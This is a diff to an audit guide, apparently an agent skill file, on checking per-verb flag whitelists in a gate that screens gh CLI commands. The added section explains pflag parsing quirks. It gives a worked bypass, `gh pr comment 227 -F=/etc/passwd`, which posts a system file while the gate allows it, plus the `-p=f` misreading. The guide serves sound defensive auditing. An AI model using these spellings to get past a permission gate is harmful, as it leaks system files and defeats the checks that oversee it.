@@ -1,6 +1,6 @@
 ---
 name: audit-a-help-derived-flag-whitelist
-description: When a gate PR claims a per-verb flag table is "the verb's COMPLETE grammar from --help", machine-diff every verb's spec against its own --help on two axes (presence AND value/bool arity) by parsing the Go table with python — and remember that --help is not the accepted grammar, so cobra's unrendered `-h` escapes the transcription.
+description: When a gate PR claims a per-verb flag table is "the verb's COMPLETE grammar from --help", machine-diff every verb's spec against its own --help on two axes (presence AND value/bool arity) by parsing the Go table with python — and remember that --help is not the accepted grammar, so pflag's unrendered `-h` and its `-F=path` spelling escape the transcription.
 metadata:
   type: reference
 ---
@@ -29,14 +29,31 @@ description text that begins with a flag-shaped word — gh renders
 `--succeed-on-no-caches --all   Return exit code 0…`, which parses as a type;
 read the raw line (`cat -A`) before filing.
 
-**`--help` output is not the accepted grammar.** cobra registers `-h` on every
-command but gh's help block prints only `--help`, so a table transcribed
-faithfully from help still escalates `gh pr comment -h` — verified accepted
-(`gh pr comment -h` and `gh gist create -h` both print help, exit 0) while the
-PR's binary asked. That is the residual class for ANY help-derived whitelist:
-auto-registered flags, hidden flags, and abbreviations the flag library accepts.
-Check whether the tool's framework adds anything the help omits before accepting
-"complete".
+**`--help` output is not the accepted grammar.** gh's help block prints only
+`--help`, so a table transcribed faithfully from help still escalated
+`gh pr comment -h` — verified accepted (`gh pr comment -h` and
+`gh gist create -h` both print help, exit 0) while the PR's binary asked. #232's
+fix round modelled it. The mechanism is **pflag, not cobra**: gh's root
+registers a persistent `--help` with no shorthand
+(`cmd.PersistentFlags().Bool("help", …)`), which `mergePersistentFlags` makes
+visible to cobra's `InitDefaultHelpFlag`, so cobra never adds `-h`; pflag's
+`parseSingleShortArg` answers an *unregistered* `h` with `f.usage()` + `ErrHelp`
+instead of an error. So read the flag LIBRARY's parser, not just the framework.
+
+**The rest of that class is where the teeth are.** pflag also strips an `=`
+immediately after a shorthand (`if len(shorthands) > 2 && shorthands[1] == '='`),
+which getopt does not, so `gh pr comment 227 -F=/etc/passwd` opens `/etc/passwd`
+while a getopt-shaped extractor reads the value as the relative, in-repo
+`=/etc/passwd` — an outright ALLOW on the exfil #229 exists to stop, found while
+fixing the `-h` Low and fixed with it. The sibling reading, `-p=f` =
+`--public=false`, ends the token, so a walk that keeps screening past the `=`
+reads the trailing `f` as `--filename` and swallows the next operand. When a
+finding names ONE unrendered spelling, the parser's whole grammar is the class:
+diff the spec against the LIBRARY's parse, and probe `-x=value` on both a
+value-taking and a bool shorthand. Hidden flags are worth one search
+(`gh api -X GET search/code -f q='MarkHidden repo:cli/cli path:pkg/cmd'` — none
+of the 25 modelled pairs has one) and abbreviations are not a pflag feature
+(`gh pr comment --bod x` → `unknown flag`).
 
 **How to apply:** on any gate PR that adds or extends a per-verb/per-program
 flag whitelist. Keep the audit scripts in `<repo>/.claude/tmp/<slug>/` and run
